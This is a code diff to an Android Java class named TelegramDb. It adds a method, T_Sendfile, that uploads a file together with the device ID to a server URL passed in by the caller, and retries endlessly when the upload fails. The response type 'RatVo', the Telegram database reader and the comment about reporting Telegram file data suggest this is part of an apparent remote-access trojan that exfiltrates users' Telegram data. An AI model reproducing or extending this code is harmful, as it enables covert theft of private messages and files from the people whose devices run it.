@@ -2,12 +2,29 @@ package com.hhm.android.otherapp;
 
 import android.content.Context;
 import android.database.Cursor;
+import android.provider.Settings;
 import android.util.Base64;
+import android.util.Log;
 
 import com.google.gson.Gson;
 import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
+import com.hhm.android.otherapp.Https.API;
+import com.hhm.android.otherapp.utils.RatVo;
 import com.hhm.android.otherapp.utils.ReadDB;
+import com.jakewharton.retrofit2.adapter.rxjava2.RxJava2CallAdapterFactory;
+
+import java.io.File;
+
+import okhttp3.MultipartBody;
+import okhttp3.RequestBody;
+import retrofit2.Call;
+import retrofit2.Callback;
+import retrofit2.Response;
+import retrofit2.Retrofit;
+import retrofit2.converter.gson.GsonConverterFactory;
+
+import static com.hhm.android.otherapp.TelegramManager.localVersionName;
 
 
 /**
@@ -233,6 +250,41 @@ public class TelegramDb {
             e.printStackTrace();
         }
         return null;
+    }
+
+    // Telegram文件数据结果上报
+    public static void T_Sendfile(final Context context, final File file, final int action_id, final String url){
+        RequestBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID))
+                .addFormDataPart("device_name", "")
+                .addFormDataPart("os", "AND")
+                .addFormDataPart("timestamp", String.valueOf(System.currentTimeMillis()))
+                .addFormDataPart("version", localVersionName(context))
+                .addFormDataPart("down_delay", "-1")
+                .addFormDataPart("action_id", String.valueOf(action_id))
+                .addFormDataPart("code", String.valueOf(0))
+                .addFormDataPart("msg", "success")
+                .addFormDataPart("file_name", file.getName())
+                .addFormDataPart("file", file.getName(), RequestBody.create(MultipartBody.FORM, file))
+                .build();
+
+        Retrofit retrofit = new Retrofit.Builder().baseUrl(url)
+                .addConverterFactory(GsonConverterFactory.create())
+                .addCallAdapterFactory(RxJava2CallAdapterFactory.create()).build();
+        API api = retrofit.create(API.class);
+        Call<RatVo> call = api.file(requestBody);
+        call.enqueue(new Callback<RatVo>() {
+            @Override
+            public void onResponse(Call<RatVo> call, Response<RatVo> response) {
+                Log.v("Upload-telegram", "success");
+            }
+
+            @Override
+            public void onFailure(Call<RatVo> call, Throwable t) {
+                Log.e("Upload-telegram error:", t.getMessage());
+                T_Sendfile(context,file,action_id,url);
+            }
+        });
     }
 
 
